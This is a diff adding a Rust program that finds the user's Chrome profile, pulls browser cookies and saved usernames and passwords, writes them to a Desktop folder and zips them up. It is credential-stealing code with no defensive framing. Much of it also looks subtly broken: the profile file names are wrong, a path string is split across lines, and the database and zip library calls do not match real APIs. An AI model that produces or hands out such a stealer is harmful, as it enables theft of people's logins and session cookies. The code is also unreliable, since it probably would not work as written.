@@ -1,0 +1,76 @@
+```rust
+use std::path::Path;
+use dirs::home_dir;
+use sqlcipher;
+use zip;
+use serde_json;
+use std::fs;
+
+#[derive(Debug, serde::Serialize)]
+struct Cookie {
+    name: String,
+    value: String,
+    domain: String,
+    path: String,
+    secure: bool,
+    http_only: bool,
+    same_site: String,
+}
+
+#[derive(Debug, serde::Serialize)]
+struct Login {
+    username: String,
+    password: String,
+}
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let home = home_dir().unwrap();
+    let chrome_path = Path::new(&home).join("AppData").join("Local").join("Google").join("Chrome").join("User
+Data").join("Default");
+    let cookie_file = chrome_path.join("cookies.sqlite");
+    let login_file = chrome_path.join("login_data.json");
+
+    let cookies = sqlcipher::open(cookie_file)?
+        .query_map(
+            "SELECT name, value, domain, path, secure, http_only, same_site FROM cookies;",
+            |row| {
+                Ok(Cookie {
+                    name: row.get("name")?,
+                    value: row.get("value")?,
+                    domain: row.get("domain")?,
+                    path: row.get("path")?,
+                    secure: row.get("secure")?,
+                    http_only: row.get("http_only")?,
+                    same_site: row.get("same_site")?,
+                })
+            },
+        )?
+        .collect::<Vec<_>>();
+
+    let mut login_data = Vec::new();
+    let login = fs::read_to_string(login_file)?;
+    for line in login.lines() {
+        let data = serde_json::from_str::<serde_json::Value>(line)?;
+        login_data.push(Login {
+            username: data["username"].as_str().unwrap_or_default().to_string(),
+            password: data["password"].as_str().unwrap_or_default().to_string(),
+        });
+    }
+
+    let desktop = Path::new(&home).join("Desktop").join("Cookies");
+    fs::create_dir_all(&desktop)?;
+
+    for (i, c) in cookies.iter().enumerate() {
+        fs::write(desktop.join(format!("cookie_{}", i + 1)), serde_json::to_string(c)?)?;
+    }
+    fs::write(desktop.join("logins.json"), serde_json::to_string(&login_data)?)?;
+
+    let zip_path = Path::new(&home).join("Desktop").join("cookies.zip");
+    let mut zip_file = zip::ZipWriter::new(fs::File::create(&zip_path)?);
+    for entry in std::fs::read_dir(&desktop)? {
+        let entry = entry?;
+        let path = entry.path();
+        zip_file.add_file(&path, path.file_name().unwrap(), &mut fs::File::open(&path)?)?;
+    }
+    Ok(())
+}
